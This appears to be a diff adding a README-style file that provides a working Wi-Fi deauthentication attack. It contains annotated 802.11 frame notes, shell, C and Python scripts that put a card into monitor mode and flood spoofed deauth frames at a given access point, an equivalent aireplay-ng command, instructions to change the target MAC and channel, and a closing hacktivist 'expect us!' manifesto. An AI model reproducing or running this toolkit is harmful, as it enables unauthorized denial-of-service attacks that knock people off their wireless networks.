@@ -1,0 +1,148 @@
+*reference <code>IEEE Xplore 80211-2020.pdf</code>*
+```txt
+a=RadioTap()
+b=raw(a)
+return b'\x00\x00\x08\x00\x00\x00\x00\x00'
+struct.unpack("<BBHI",b)
+< little endian
+B unsigned char int 0-255 int8 version
+B unsigned char int 0-255 int8 padding
+H unsigned short int 0-65535 int16 length
+I unsigned int int  0-4294967295 int32 bitmask
+return (0, 0, 8, 0)
+struct.pack("<BBHI",0,0,8,0)
+return b'\x00\x00\x08\x00\x00\x00\x00\x00'
+Type:00
+Type description:management
+Subtype value:12 or 0b1100
+Subtype description Deauthentication
+759 page Table9-1
+Frame Control Field's SubField depend on Type and Subtype SubField.(page 822)
+for this standard,the value of the protocol version is 0 for MAC frames and 1 for PV1 MAC frames.(758 page 9.2.4.1.2)
+this reason code field is used to indicate the reason that an deauthentication.(page 870 9.4.1.7)
+reason code 7 Name INVALID_CLASS3_FRAME | class three frame received from nonassociated STA.(page 870 Table 9-49)
+hex:0x0007
+Duration attribute ID equal to 0 microseconds.
+hex:b'\x00\x00'
+page 213 RA:receiver address or receiving station address.
+page 216 TA:transmitter address or transmitting station address.
+page 207 DS:distribution system.
+page 769 Sequence Control field is not present in control frame. 
+page 758 Figure9-5 frame control field format in S1G PPDU.
+protocol version 2bit.
+type 2bit.
+subtype 4bit.
+in control frames,to ds and from ds,when present,are both zero.(page 761)
+in all non-QMF Management frames.(Table 9-4)
+retry subfield set to 0 because it is not a retransmission of the management frame.(page 762)
+the Power Management(PWR MGT) subfield set to 0 indicates that the STA will be in active mode.(non-PS power saving mode)
+More Fragments subfield set to 0,because it is non-MSDU(MAC service data unit) or MMPDU(MAC management protocol data unit) data or management frame and more fragment subfield is present.(page 762)
+More Data subfield set to 0,because AP has no BU(Bufferable Unit)(page 762)
+the protected frame subfield is set to 0 if the frame body field('\x07\x00')(page 855) not contains information that has been processed by a cryptographic encapsulation algorithm.(page 764)
+```
+```sh
+#! /bin/sh
+# 0.sh 
+service NetworkManager stop
+service wpa_supplicant stop
+ifconfig wlan0 down
+python3 11.py
+ifconfig wlan0 up
+gcc 0.c -o 0
+./0
+python3 3.py
+```
+```c
+// 0.c
+// 40167434@qq.com
+#include <stdio.h>
+#include <stdlib.h>
+#include <string.h>
+#include <unistd.h>
+#include <sys/ioctl.h>
+#include <sys/socket.h>
+#include <linux/wireless.h>
+int csh(const char *a,int b){
+    int s;
+    struct iwreq y;
+    if ((s=socket(AF_INET,SOCK_DGRAM,0))<0) {
+        perror("Fuck You!!");
+        return -1;
+    }
+    memset(&y,0,sizeof(y));
+    snprintf(y.ifr_name,IFALIASZ,"%s",a);
+    y.u.freq.m = b;
+    y.u.freq.flags = IW_FREQ_FIXED;
+    if (ioctl(s,SIOCSIWFREQ,&y)<0) {
+        perror("Syntax Not OK");
+        close(s);
+        return -1;
+    }
+    close(s);
+    return 0;
+}
+
+int main() {
+    const char *a = "wlan0";
+    int b = 1;
+    if (csh(a,b)==0) {
+        printf("Syntax OK");
+    }
+    return 0;
+}
+```
+```python
+"""
+11.py
+"""
+import socket
+import fcntl
+import struct
+print('import library')
+try:
+    s=None
+    s=socket.socket()
+    print('create socket.')
+    r=struct.pack(
+        '16sH',
+        'wlan0'.encode('utf-8').ljust(16,b'\0'),
+        6
+    )
+    print('defined iwreq struct.network card wlan0.')
+    fcntl.ioctl(s.fileno(),0x8B06,r)
+    print('network card mode:monitor.')
+except IOError:
+    print("NetworkManager or wpa_supplicant is running.or network card status is 'down'.")
+```
+```python 
+"""
+3.py
+"""
+from scapy.all import *
+print('import library')
+d=RadioTap()/Dot11(addr1='ff:ff:ff:ff:ff:ff',addr2='1c:ff:59:33:7f:ff',addr3='1c:ff:59:33:7f:ff',type=0,subtype=12)/Dot11Deauth(reason=7)
+print('defined RadioTap header(is a de facto standard for 802.11 frame injection and reception.) and Deauth broadcast message\nAP's MAC address:\t1c:ff:59:33:7f:ff\ntype:management frame\n reason code:class three frame received from nonassociated STA.\n')
+for s in range(0,1920):
+    p=d.copy()
+	print('copied frame.')
+	p[Dot11].SC=(s<<4)
+	print('the serial number control has been moved 4 digits to the right.')
+	sendp(p,iface='wlan0',inter=0,verbose=False,count=1)
+	print('interface:wlan0.send interval:0 seconds.verbose output:false.count:one')
+```
+*<code>bash 0.sh</code>*
+*please add <code>sleep</code> to <code>0.sh</code> by yourself and modify channel <code>b</code> in the <code>main</code> function in <code>0.c</code>*
+*as well as <code>addr2</code> and <code>addr3</code> in the <code>3.py</code>*
+*equivlent to execute <code>bash 1.sh</code>*
+```sh
+#! /bin/sh
+# 1.sh
+aireplay-ng -0 <int> -a 1C:FF:59:33:7F:FF(AP) --ignore-negative-one -D wlan0
+```
+*we are ICU,*
+*we are human rights activists in cyberspace,*
+*hacking is always a weapon for us to bring justice;*
+*the unknown train will never stop,*
+*but when the passengers arrive,*
+*they will get off the train and new people will join them.*
+*expect us!*
